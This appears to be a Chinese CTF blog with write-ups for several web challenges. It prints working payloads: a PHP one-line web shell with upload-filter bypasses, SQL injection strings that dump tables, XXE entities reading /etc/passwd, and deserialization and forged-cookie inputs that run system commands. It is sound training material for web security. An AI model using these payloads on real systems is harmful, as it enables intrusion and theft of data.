<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://bb232cbc-9635-4f1f-bbdb-d01f82b431ee.node3.buuoj.cn/&#x27;</span>		<span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        print(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(requests.get(url).status_code)</span><br></pre></td></tr></table></figure>
<p>得到一个<a href="http://www.zip/">www.zip</a></p>
<p>发现是一道php反序列化绕过，这里简化了一下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据代码构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>然后用python提交get，成功得到flag（虽然不知道为啥Hackbar提交没反应</p>
<blockquote>
<p>flag{361e4af6-f242-4f37-888e-17491b76ecd2}</p>
</blockquote>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>进入发现需要上传文件，构造一个一句话木马扔上去</p>
<p>用burpsuites抓包改一下文件类型</p>
<p>然后提示不能包含&lt;?字符，去度娘搜了一下之后发现可以在文件头部加上**GIF89a?**绕过这个点</p>
<p>然后又提示不能用php类型文件</p>
<p>一番查找了之后发现了一个.phtml类型</p>
<p>重新构造了一下木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;rossweisse&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>用菜刀链接即可得到flag</p>
<blockquote>
<p>flag{43921141-5d8f-4c88-b07c-55b0801220ca}</p>
</blockquote>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这题也是一道sql注入题</p>
<p>按照原来的套路试了几次之后发现把关键字都ban了</p>
<p>那么我们可双写关键字来进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; ununionion seselectlect 1,group_concat(table_name),3  frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23 #爆表名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(column_name),3  frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;database() aandnd table_name&#x3D;&#39;b4bsql&#39; %23 #爆列名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(concat_ws(0x7e,username,passwoorrd)),3  frfromom b4bsql %23 #爆数据</span><br></pre></td></tr></table></figure>
<p>拿到flag</p>
<blockquote>
<p>flag{cbf6aeea-a401-4c47-b000-c373eaef6289}</p>
</blockquote>
<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>这题进来之后发现只有一个payflag页面可以进</p>
<p>进入之后ctrl+U在下面发现了一串代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>可以得知咱要以POST方式发送一个不是数字并且要等于404的password变量和money变量</p>
<p>发现burpsuite重发之后会出现一句<strong>Only Cuit’s students can buy the FLAG</strong></p>
<p>这里咱重新查看下抓的包，发现了一个user参数，令user=1</p>
<p>发送出去之后前两个都正确了，但是还是出现了一句<strong>Nember lenth is too long</strong></p>
<p>那只能是money参数出现了问题，将money=100000000改为money=1e9即可得到flag</p>
<p><img src="https://i.loli.net/2021/03/14/LSq3PIr8Q2TlzcO.png"></p>
<blockquote>
<p>flag{68ff87f9-0c7f-4c49-b057-2af8e9ea3ed3}</p>
</blockquote>
<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>这题sql注入惯例试了下<strong>1’ or 1=1 %23</strong></p>
<p>结果很友善的回了一句臭弟弟</p>
<p>之后试了一下其他的发现把空格等一些字符还有union给ban了，于是就想到了报错注入</p>
<p><strong>1’or(updatexml(1,concat_ws((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆表名</strong><br><strong>1’or(updatexml(1,concat_ws((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆列名</strong><br><strong>1’or(updatexml(1,concat_ws((select(concat_ws(0x7e,username,password))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆数据</strong>（结果发现只有一半，后面查到了一个right()</p>
<p><strong>1’or(updatexml(1,concat_ws((select(right(group_concat(password),20))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆后边的flag</strong>（这里要注意flag的连接，不是对半开的</p>
<p>这里是flag</p>
<blockquote>
<p>flag{16f2507c-b985-4744-9b3b-8f02007f0c29}</p>
</blockquote>
<h2 id="安洵杯easy-web"><a href="#安洵杯easy-web" class="headerlink" title="安洵杯easy_web"></a>安洵杯easy_web</h2><h3 id="md5碰撞绕过"><a href="#md5碰撞绕过" class="headerlink" title="md5碰撞绕过"></a>md5碰撞绕过</h3><p>学习到了可以通过md5碰撞绕过md5</p>
<p>但是找到的那个.exe程序运行了没反应，所以先把参数记下来后面用到可以直接拿来先用着</p>
<h2 id="网鼎杯phpweb"><a href="#网鼎杯phpweb" class="headerlink" title="网鼎杯phpweb"></a>网鼎杯phpweb</h2><p><img src="https://i.loli.net/2021/04/16/XPuztLepqZaQYWU.png"></p>
<h3 id="file-get-contents-得到源码"><a href="#file-get-contents-得到源码" class="headerlink" title="file_get_contents()得到源码"></a>file_get_contents()得到源码</h3><p>抓包后发现可以输入点，可以看出是放个函数和函数的参数</p>
<p>于是我们可以利用<code>file_get_contents()</code>函数来得到index.php的源代码</p>
<blockquote>
<p>func=file_get_contents()&amp;p=index.php</p>
</blockquote>
<p>拿到index.php源代码之后可以发现func那里拦截了许多函数，但是有一个有一个Test类可以进行利用</p>
<h3 id="反序列化RCE"><a href="#反序列化RCE" class="headerlink" title="反序列化RCE"></a>反序列化RCE</h3><p>构造反序列化代码进行RCE</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>tips：flag并不在根目录下，所以还需要<code>find / -name flag</code>来查找flag</p>
<p>最终得到flag</p>
<blockquote>
<p>   flag{d1569b58-26c5-4528-95fa-150f11cab19e}</p>
</blockquote>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="flask框架分析"><a href="#flask框架分析" class="headerlink" title="flask框架分析"></a>flask框架分析</h3><p>打开题目拿到一串很长很长的代码</p>
<p>优化一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):</span><br><span class="line">            <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>先看路由，有一个/geneSign和一个/De1ta</p>
<p>看看/geneSign</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure>
<p>get方法传入一个param，然后到getSign函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>md5编码一个随机数值+param+action</p>
<p>再看看/De1ta</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure>
<p>通过GET方法传入param，通过cookie传入action和sign</p>
<p>再往下会遇到一个if，然后进入waf函数</p>
<p>看看waf函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>如果参数头是<code>gopher</code>或<code>file</code>就会被防住</p>
<h3 id="sign-payload构造"><a href="#sign-payload构造" class="headerlink" title="sign payload构造"></a>sign payload构造</h3><p>最后会构造一个Task类</p>
<p>Task类里首先会遇到一个checkSign方法</p>
<p>会判断<code>getSign(self.action, self.param) == self.sign</code></p>
<p>这里的意思就是我们要构造一个getSign使得<code>md5(param+action)</code>==<code>md5(param+&#39;scan&#39;(不可控))</code>，这里我们可以利用/geneSign路由进行自主构造sign参数</p>
<p>param=flag.txtread，因为Task类里的if判断是包含，所以我们可以在后面加一个read绕过判断</p>
<p>最后可以得到sign的payload</p>
<blockquote>
<p>param=flag.txtread</p>
</blockquote>
<h3 id="action-payload构造"><a href="#action-payload构造" class="headerlink" title="action payload构造"></a>action payload构造</h3><p>最后就是</p>
<p>构造一个action的payload进行flag.txt的读取，action又需要同时进入两个if</p>
<p>所以我们可以这样整</p>
<p>param=flag.txt</p>
<p>action=readscan</p>
<p>sign=94f5d01e5071cf13ee12db1b5b76c89f(sign就拿之前在/geneSign路由上得到的</p>
<p>最后得到flag</p>
<blockquote>
<p>flag{4d8642e8-b33b-439d-8219-651342e482b5}</p>
</blockquote>
<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><h3 id="XML实体注入"><a href="#XML实体注入" class="headerlink" title="XML实体注入"></a>XML实体注入</h3><p>抓包后发现username和password都是xml格式的，所以我们可以选择XML注入</p>
<p>读取/etc/passwd文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>读取flag</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终得到flag</p>
<blockquote>
<p>flag{b831032d-7b48-4d76-bb55-01a9a629def6}</p>
</blockquote>
<h3 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h3><p>顺便了解了一下XML和什么是XXE注入</p>
<p>XXE看字</p>
<blockquote>
<p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
</blockquote>
<p>XML可以看看这篇文章<a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a></p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>进入后可以输入队伍ID和价钱，1、2、3都试了一遍然后都出错了，猜测Team4购买成功后就可以拿到flag了</p>
<p>试试team4，然后提示<code>Only one char(?) allowed!</code>，只允许输入一个字符</p>
<h3 id="UTF-8特殊字符代替"><a href="#UTF-8特殊字符代替" class="headerlink" title="UTF-8特殊字符代替"></a>UTF-8特殊字符代替</h3><p>看了看源码发现提示</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="comment">&lt;!--Ah,really important,seriously. --&gt;</span></span><br></pre></td></tr></table></figure>
<p>了解了一下UTF-8编码，发现UTF-8编码其实有特别多特别多的字符</p>
<p>这里可以去<a href="https://www.compart.com/en/unicode/">这个网站</a>，这个网站拥有许多UTF-8字符</p>
<p>查找thousand，最后发现了一个字符ↁ，这个字符的Numeric Value为5000，正好符合我们的要求</p>
<p>最后即可得到flag</p>
<blockquote>
<p>flag{76457339-63ab-4556-b52e-5a2f6d054406}</p>
</blockquote>
<h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><h3 id="SSTI获取screat-key"><a href="#SSTI获取screat-key" class="headerlink" title="SSTI获取screat_key"></a>SSTI获取screat_key</h3><p>题目是一个简易计算器，测试<code>1/0</code>发现出现错误，猜测是模板注入，输入<code>1/0#&#123;&#123;config&#125;&#125;</code>，发现了screat_key</p>
<h3 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h3><p>用<code>flask-session-cookie-manager</code>解出cookie的结构，使用上面获取的key进行cookie伪造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;&#x27;history&#x27;:[&#123;&#x27;code&#x27;:&#x27;__import__[\&quot;os\&quot;].popen(\&quot;cat flag.txt\&quot;).read()&#x27;&#125;]&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>最后得到flag</p>
<blockquote>
<p>flag{3990ba1e-8331-4dd6-8bae-77ac90a09c81}</p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这题对现在的我来说是一道比较新鲜的题，知道了还有cookie伪造的这个姿势，重新了解了一下cookie的含义</p>
<h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>进入题目看见一句<code>You&#39;ll be rewarded with a flag if you can make it over some /hurdles.</code></p>
<h3 id="curl的命令使用"><a href="#curl的命令使用" class="headerlink" title="curl的命令使用"></a>curl的命令使用</h3><p>通过curl查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was expecting the PUT Method.</code></p>
